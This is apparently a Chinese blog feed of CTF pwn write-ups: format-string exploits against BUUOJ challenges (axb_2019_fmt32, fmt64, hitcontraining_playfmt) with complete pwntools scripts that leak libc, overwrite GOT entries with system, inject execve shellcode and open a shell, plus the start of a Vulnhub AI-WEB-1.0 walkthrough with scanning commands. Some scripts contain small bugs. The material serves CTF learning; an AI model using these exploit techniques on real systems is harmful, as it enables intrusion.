<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sys_addr1 = sys_addr&amp;<span class="number">0xff</span></span><br><span class="line">sys_addr2 = (sys_addr&amp;<span class="number">0xff00</span>)&gt;&gt;<span class="number">8</span></span><br><span class="line">sys_addr3 = (sys_addr&amp;<span class="number">0xff0000</span>)&gt;&gt;<span class="number">16</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr1 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr2 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr3 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr3))</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931920.png" alt="image-20240130175341704" style="zoom:67%;" />

<p>​	然后下面这一步中<code>sys_addr1-(9+13)</code>减的是<code>printf</code>中前面参数字节的总和，程序中的<code>Repeater:</code>是<code>9</code>个字节，<code>payload2 = b&#39;a&#39;+p32(strlen_got)+p32(strlen_got+1)+p32(strlen_dot+2)</code>一共<code>13</code>个字节。（其实为什么要这样我也不知道）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sys_addr1_value = sys_addr1-(<span class="number">9</span>+<span class="number">13</span>) <span class="comment"># 前面已经输出了0xa+0x10个字符，要减去</span></span><br><span class="line">result = sys_addr2-sys_addr1</span><br><span class="line">sys_addr2_value = result <span class="keyword">if</span> result&gt;<span class="number">0</span> <span class="keyword">else</span> result+<span class="number">0x100</span> <span class="comment"># 假如倒数第二个字节本身比倒数第一个字节小，那倒数第二个字节+0x100，这样才可以写入正确字节</span></span><br><span class="line">result = sys_addr3-sys_addr2</span><br><span class="line">sys_addr3_value = result <span class="keyword">if</span> result&gt;<span class="number">0</span> <span class="keyword">else</span> result+<span class="number">0x100</span> <span class="comment"># 同理</span></span><br><span class="line"></span><br><span class="line">result = system_addr_4-system_addr_3</span><br><span class="line">system_addr_4_value = result <span class="keyword">if</span> result&gt;<span class="number">0</span> <span class="keyword">else</span> result+<span class="number">0x100</span> <span class="comment"># 同理</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​	最后构造<code>payload2</code>，<code>bytes(str(sys_addr1_value),encoding=&#39;utf-8&#39;)</code>的意思是把<code>sys_addr1-value</code>转换为字节串<code>bytes</code>类型。<code>%hhn</code>是修改低<code>1</code>个字节，<code>printf_got+1</code>会把<code>printf_got</code>的倒数第二个字节变成倒数第一个，然后就可以修改低<code>2</code>个字节了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>+p32(printf_got)+p32(printf_got+<span class="number">1</span>)+p32(printf_got+<span class="number">2</span>)</span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr1_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%8$hhn&#x27;</span></span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr2_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%9$hhn&#x27;</span></span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr3_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%10$hhn&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a><code>exp</code></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;./axb&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26252</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./axb&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;me:&#x27;</span>)</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>+p32(printf_got)+<span class="string">b&#x27;bbbb&#x27;</span>+<span class="string">b&#x27;%8$s&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">printf_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">base_addr = printf_addr-libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">sys_addr = base_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;printf_addr =&gt;&#x27;</span>,<span class="built_in">hex</span>(printf_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line"></span><br><span class="line">sys_addr1 = sys_addr&amp;<span class="number">0xff</span></span><br><span class="line">sys_addr2 = (sys_addr&amp;<span class="number">0xff00</span>)&gt;&gt;<span class="number">8</span></span><br><span class="line">sys_addr3 = (sys_addr&amp;<span class="number">0xff0000</span>)&gt;&gt;<span class="number">16</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr1 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr2 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys_addr3 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr3))</span><br><span class="line">sys_addr1_value = sys_addr1-(<span class="number">9</span>+<span class="number">13</span>) <span class="comment"># 前面已经输出了0xa+0x10个字符，要减去</span></span><br><span class="line">result = sys_addr2-sys_addr1</span><br><span class="line">sys_addr2_value = result <span class="keyword">if</span> result&gt;<span class="number">0</span> <span class="keyword">else</span> result+<span class="number">0x100</span> <span class="comment"># 假如倒数第二个字节本身比倒数第一个字节小，那倒数第二个字节+0x100，这样才可以写入正确字节</span></span><br><span class="line">result = sys_addr3-sys_addr2</span><br><span class="line">sys_addr3_value = result <span class="keyword">if</span> result&gt;<span class="number">0</span> <span class="keyword">else</span> result+<span class="number">0x100</span> </span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>+p32(printf_got)+p32(printf_got+<span class="number">1</span>)+p32(printf_got+<span class="number">2</span>)</span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr1_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%8$hhn&#x27;</span></span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr2_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%9$hhn&#x27;</span></span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr3_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%10$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">payload3 = <span class="string">b&#x27;;/bin/sh\x00&#x27;</span></span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931882.png" alt="image-20240130173634524"></p>
<h2 id="axb-2019-fmt64"><a href="#axb-2019-fmt64" class="headerlink" title="axb_2019_fmt64"></a><code>axb_2019_fmt64</code></h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931312.png" alt="image-20240130200837648"></p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>​	第一步，计算偏移量为<code>8</code></p>
<p>​	<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181931509.png" alt="image-20240130130959078"></p>
<p>​	到了与<code>32</code>位程序不一样的地方了，泄漏地址这里如果是按照<code>32</code>的写成<code>payload = p64(puts)+b&#39;%8$saaaa&#39;</code>，然后我们看到发送的数据在<code>puts_got</code>与<code>%8$s</code>之间有很多<code>&#39;00&#39;</code>，字符串中的<code>&#39;00&#39;</code>就代表结束，所以在<code>printf</code>到<code>&#39;00&#39;</code>的时候就以为字符串后面没有内容了，后面的内容也就不会被<code>printf</code>了。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932606.png" alt="屏幕截图 2024-01-30 185641"></p>
<p>​	因此我们现在要换个写法构造<code>payload</code>，<code>payload = b&#39;%9$saaaa&#39;+p64(puts_got)</code>这样我们可以看到<code>&#39;00&#39;</code>就在后面了，有用的字符串也就不会再被截断了。<code>9</code>是因为现在<code>p64(puts_got)</code>变成了第<code>2</code>个参数了。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932056.png" alt="屏幕截图 2024-01-30 191730"></p>
<p>​	刚开始我泄漏的是<code>printf</code>函数的<code>got</code>表值，但是不知道为什么一直不成功，后来看别的师傅的<code>wp</code>泄漏的都是<code>puts</code>函数就可以，后来我用<code>read,strlen</code>这些函数都可以。然后我发现<code>puts</code>函数发送的是<code>0x601018</code>（重定位前），接收的是<code>0x7fd7f1458690</code>（重定位后）</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932500.png" alt="屏幕截图 2024-01-30 184334"></p>
<p>​	而<code>printf</code>函数发送的与接收的一样都是<code>0x601030</code>，也就是说并没有泄漏出<code>printf</code>重定位后的<code>got</code>表值，所以就不能泄漏<code>printf</code>的<code>got</code>表值</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932215.png" alt="屏幕截图 2024-01-30 184858"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload1 = <span class="string">b&#x27;%9$saaaa&#x27;</span>+p64(puts_got)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Please tell me:&#x27;</span>,payload1)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">base_addr = puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr = base_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">strlen_addr = base_addr+libc.sym[<span class="string">&#x27;strlen&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;system_add =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;strlen_add =&gt;&#x27;</span>,<span class="built_in">hex</span>(strlen_addr))</span><br></pre></td></tr></table></figure>

<p>​	打印出来他们的地址，发现只有后<code>3</code>个字节不一样，我们只需要修改后<code>3</code>个字节即可</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932156.png" alt="image-20240130193456108"></p>
<p>​	同<code>32</code>位，分别表示出这<code>3</code>个字节</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sys_addr1 = system_addr&amp;<span class="number">0xff</span></span><br><span class="line">sys_addr2 = (system_addr&amp;<span class="number">0xff00</span>)&gt;&gt;<span class="number">8</span></span><br><span class="line">sys_addr3 = (system_addr&amp;<span class="number">0xff0000</span>)&gt;&gt;<span class="number">16</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys1 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sysaddr1)) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys2 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sysaddr2)) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys3 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sysaddr3))  </span><br><span class="line"><span class="comment">#9是输出的“Repeater:”的字符数</span></span><br><span class="line">sys_addr1_value = sys_addr1-<span class="number">9</span></span><br><span class="line">result = sys_addr2-sys_addr1</span><br><span class="line">sys_addr2_value=result <span class="keyword">if</span> result&gt;<span class="number">0</span> <span class="keyword">else</span> result+<span class="number">0x100</span></span><br><span class="line">result = sys_addr3-sys_addr2</span><br><span class="line">sys_addr3_value=result <span class="keyword">if</span> result&gt;<span class="number">0</span> <span class="keyword">else</span> result+<span class="number">0x100</span></span><br></pre></td></tr></table></figure>

<p>​	构造第二个<code>payload</code>的时候同样不能和<code>32</code>位的题一样了，<code>payload2 = b&#39;%&#39;+bytes(str(sysaddr1_value),encoding=&#39;utf-8&#39;)+b&#39;c&#39;+b&#39;%13$hhn&#39; </code>的意思是将<code>sys_addr1_value</code>的值作为字符写入到第<code>13</code>个参数所指向的内存地址中，<code>%hhn</code>是只修改<code>1</code>个字符的意思。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload2 = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr1_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%13$hhn&#x27;</span> </span><br><span class="line"><span class="comment">#将会使用格式化字符串漏洞将sysaddr1_value的值作为字符写入到第13个参数所指向的内存地址中。</span></span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr2_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%14$hhn&#x27;</span> </span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr3_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%15$hhn&#x27;</span> </span><br><span class="line">payload2 = payload2.ljust(<span class="number">40</span>,<span class="string">b&#x27;a&#x27;</span>)  <span class="comment">#意思是把payload填充到8的整数倍，由于是64位的栈上的地址或者数据都是8个字节的，也就是说8个字节占一个参数位，这里是5倍也就是5个参数，第一个参数的偏移量是8，9，10，11，12</span></span><br><span class="line">payload2 += p64(strlen_got)+p64(strlen_got+<span class="number">1</span>)+p64(strlen_got+<span class="number">2</span>)</span><br><span class="line"><span class="comment">#          第13个参数         第14个参数          第15个参数</span></span><br><span class="line"><span class="comment">#综上所述，当对目标地址加一（进行偏移）时，读取到的真实地址就也在变化，这样，我们就可以确定真实地址的每一位所在的位置了</span></span><br></pre></td></tr></table></figure>

<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a><code>exp</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;)</span></span><br><span class="line"><span class="comment">#p = process(&quot;./fmt64&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26762</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./fmt64&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">strlen_got = elf.got[<span class="string">&#x27;strlen&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;%9$saaaa&#x27;</span>+p64(puts_got)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Please tell me:&#x27;</span>,payload1)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">base_addr = puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr = base_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">strlen_addr = base_addr+libc.sym[<span class="string">&#x27;strlen&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;system_add =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;strlen_add =&gt;&#x27;</span>,<span class="built_in">hex</span>(strlen_addr))</span><br><span class="line"></span><br><span class="line">sys_addr1 = system_addr&amp;<span class="number">0xff</span></span><br><span class="line">sys_addr2 = (system_addr&amp;<span class="number">0xff00</span>)&gt;&gt;<span class="number">8</span></span><br><span class="line">sys_addr3 = (system_addr&amp;<span class="number">0xff0000</span>)&gt;&gt;<span class="number">16</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys1 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr1)) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys2 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr2)) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sys3 =&gt;&#x27;</span>,<span class="built_in">hex</span>(sys_addr3))  </span><br><span class="line">sys_addr1_value = sys_addr1-<span class="number">9</span></span><br><span class="line">result = sys_addr2-sys_addr1</span><br><span class="line">sys_addr2_value=result <span class="keyword">if</span> result&gt;<span class="number">0</span> <span class="keyword">else</span> result+<span class="number">0x100</span></span><br><span class="line">result = sys_addr3-sys_addr2</span><br><span class="line">sys_addr3_value=result <span class="keyword">if</span> result&gt;<span class="number">0</span> <span class="keyword">else</span> result+<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr1_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%13$hhn&#x27;</span> </span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr2_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%14$hhn&#x27;</span> </span><br><span class="line">payload2 += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(sys_addr3_value),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%15$hhn&#x27;</span> </span><br><span class="line">payload2 = payload2.ljust(<span class="number">40</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload2 += p64(strlen_got)+p64(strlen_got+<span class="number">1</span>)+p64(strlen_got+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">payload3 = <span class="string">b&#x27;;/bin/sh\x00&#x27;</span></span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932713.png" alt="image-20240130195341584"></p>
<h2 id="hitcontraining-playfmt（ebp链）"><a href="#hitcontraining-playfmt（ebp链）" class="headerlink" title="hitcontraining_playfmt（ebp链）"></a><code>hitcontraining_playfmt</code>（<code>ebp</code>链）</h2><h3 id="保护-源码"><a href="#保护-源码" class="headerlink" title="保护&amp;源码"></a>保护&amp;源码</h3><p>​	查看保护，<code>32</code>位程序，有<code>RWX</code>段我们第一时间想到用<code>shellcode</code>。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932093.png" alt="image-20240209202319987"></p>
<p>源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">do_fmt</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0xC8</span>u);</span><br><span class="line">    result = <span class="built_in">strncmp</span>(buf, <span class="string">&quot;quit&quot;</span>, <span class="number">4u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>​	分析代码，<code>printf(buf)</code>格式化字符串漏洞，<code>buf</code>在<code>.bss</code>段。大概思路就是利用格式化字符串漏洞修改函数返回地址为<code>buf</code>的起始地址<code>+4</code>（因为执行<code>ret</code>指令就需要跳出循环，就需要<code>buf</code>的前<code>4</code>个字节是<code>quit</code>），最后发送<code>shellcode</code>。</p>
<p>​	下图中<code>ebp</code>下面的<code>0xffffd07c</code>这个地址中放的是函数返回地址，我们可以把<code>0xffffd098</code>改成<code>0xffffd07c</code>，这样<code>0xffffd088 -&gt; 0xffffd098</code>就变成了<code>0xffffd088 -&gt; 0xffffd07c -&gt; 0x80485ad(play+77)</code>，我们也就可以修改<code>0xffffd07c</code>中的内容即返回地址为<code>shellcode</code>的首地址了。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932681.png" alt="屏幕截图 2024-02-09 202808"></p>
<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a><code>exp</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28906</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Server&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;=\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;%6$p&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(p.recv(<span class="number">10</span>),<span class="number">16</span>)-<span class="number">0x28</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack_addr+<span class="number">0x1c</span>)&amp;<span class="number">0xff</span>).encode()+<span class="string">b&#x27;c%6$hhn&#x27;</span> </span><br><span class="line">payload = payload.ljust(<span class="number">200</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa064</span>).encode()+<span class="string">b&#x27;c%10$hn&#x27;</span> </span><br><span class="line">payload = payload.ljust(<span class="number">200</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">xor ebx,ebx</span></span><br><span class="line"><span class="string">push ebx</span></span><br><span class="line"><span class="string">push 0x68732f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">push 11</span></span><br><span class="line"><span class="string">pop eax</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;quit&#x27;</span>+shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501181932757.png" alt="image-20240209212128942"></p>
]]></content>
      <categories>
        <category>pwn学习总结</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>格式化字符串漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试靶机vulnhub_AI-WEB-1.0通关记录</title>
    <url>/2024/11/19/%E8%AE%B0%E5%BD%95%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%89%93%E9%9D%B6%E5%9C%BA/</url>
    <content><![CDATA[<p>最近想打打靶场，找了几个入门靶场来渗透测试了一下，vulnhub的AI-WEB-1.0这个是我打的第一个靶机，整个过程还是比较顺利的(毕竟是入门级的)。</p>
<span id="more"></span>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="扫描主机"><a href="#扫描主机" class="headerlink" title="扫描主机"></a>扫描主机</h3><p>使用<code>netdiscover</code>发现主机</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.30.0/24</span><br><span class="line"><span class="comment"># eth0是网卡设备名</span></span><br><span class="line"><span class="comment"># 扫描192.168.30.0/24这个网段，检查在线主机</span></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112246262.png" alt="image-20241119153806356" style="zoom: 50%;" />

<h3 id="扫描端口"><a href="#扫描端口" class="headerlink" title="扫描端口"></a>扫描端口</h3><p>使用<code>nmap</code>扫描存活主机的端口</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -A -n 192.168.30.132</span><br><span class="line">nmap -T4 -A 192.168.30.132</span><br></pre></td></tr></table></figure>

<p>只得到<code>80</code>端口</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112246056.png" alt="image-20241119154532963" style="zoom:50%;" />

<p>浏览器访问一下<code>192.168.30.132:80</code>，好吧果然什么都没有</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255136.png" alt="image-20241119154840588" style="zoom:50%;" />

<h3 id="扫描目录"><a href="#扫描目录" class="headerlink" title="扫描目录"></a>扫描目录</h3><p>使用<code>dirb</code>扫描目录<br>参考：<a href="https://www.cnblogs.com/xiaoyus/p/18418624">DIRB：一款强大的Web目录扫描工具使用指南</a></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.30.132 -o dirb.txt</span><br><span class="line"><span class="comment">#参数: -o 输出结果</span></span><br><span class="line"><span class="comment">#扫描192.168.30.132主机上的所有目录，并将其输出到dirb.txt中</span></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255532.png" alt="image-20241119155905008" style="zoom:50%;" />

<p>直接访问<code>url</code></p>
<p><code>http://192.168.30.132/server-status</code>，无权限</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255616.png" alt="image-20241119160259061" style="zoom:50%;" />

<p><code>http://192.168.30.132/robots.txt</code>，发现两个目录</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255633.png" alt="image-20241119160218025" style="zoom:50%;" />

<p>访问这两个目录，都是无权限，下面再使用<code>dirb</code>扫描这两个目录</p>
<p><code>/m3diNf0/</code>目录：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255143.png" alt="image-20241119160816299" style="zoom: 67%;" />

<p>访问<code>http://192.168.30.132/m3diNf0/info.php</code>，是<code>php</code>配置文件，在里面发现了网站的绝对路径</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255301.png" alt="image-20241119161053952" style="zoom: 50%;" />

<p><code>/se3reTdir777/</code>目录：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255354.png" alt="image-20241119161459503" style="zoom:67%;" />

<p>访问<code>http://192.168.30.132/se3reTdir777/index.php</code>，看起来是一个<code>sql</code>注入漏洞</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255478.png" alt="image-20241119195135072" style="zoom: 67%;" />

<p>访问<code>http://192.168.30.132/se3reTdir777/uploads/</code>，无权限</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255614.png" alt="image-20241119195407387" style="zoom:50%;" />

<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a><code>sql</code>注入</h3><p>先<code>bp</code>抓包一下，确定是<code>POST</code>传参并找到注入点</p>
